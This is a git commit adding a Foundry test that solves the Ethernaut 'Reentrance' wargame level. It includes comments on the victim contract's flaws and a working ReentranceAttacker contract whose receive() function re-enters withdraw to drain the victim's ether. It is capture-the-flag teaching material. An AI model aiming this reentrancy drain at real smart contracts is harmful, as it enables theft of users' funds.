9d1009ef79652b51e3224d4d98816891442292af
oba <obatirou@gmail.com>
2023-04-21 16:25:59 +0200

    Level 10 Reentrancy: solution

--- src/test/Reentrance.t.sol
+++ src/test/Reentrance.t.sol
@@ -29,11 +29,52 @@ contract ReentranceTest is Test {
         // LEVEL ATTACK //
         //////////////////
 
+        // By analyzing the Reentrance, bugs can be spotted.
+        // withdraw function do not use SafeMath when updating the balance
+        // and do not follow the check effect interaction pattern.
+        // As it is using a solidity version < 0.8.0 in the original version,
+        // there is no automatic underflow/overflow checks.
+        // Also it sends back eth with a low level call hence it is vulnerable to reentrancy
+        // where an attacker contract can take over the flow.
+
+        // Deploy attack contract and fund it
+        ReentranceAttacker reentranceAttacker =
+            new ReentranceAttacker{value: 0.0001 ether}(address(ethernautReentrance));
+        reentranceAttacker.reenter();
+
         //////////////////////
         // LEVEL SUBMISSION //
         //////////////////////
         bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
         vm.stopPrank();
         assert(levelSuccessfullyPassed);
+    }
+}
+
+contract ReentranceAttacker {
+    Reentrance reentrance;
+    uint256 initialBalance;
+
+    constructor(address _reentrance) public payable {
+        require(_reentrance.code.length > 0, "Not a contract");
+        reentrance = Reentrance(payable(_reentrance));
+        initialBalance = msg.value;
+    }
+
+    function reenter() external {
+        // Donate to Reentrance to be able to withdraw
+        reentrance.donate{value: address(this).balance}(address(this));
+        // Withdraw from victim contract
+        reentrance.withdraw(address(this).balance);
+    }
+
+    receive() external payable {
+        // calculate balance of reentrance contract
+        uint256 victimBalance = address(reentrance).balance;
+        // if not empty, withdraw again
+        if (victimBalance != 0) {
+            uint256 withdrawAmount = victimBalance > initialBalance ? initialBalance : victimBalance;
+            reentrance.withdraw(withdrawAmount);
+        }
     }
 }
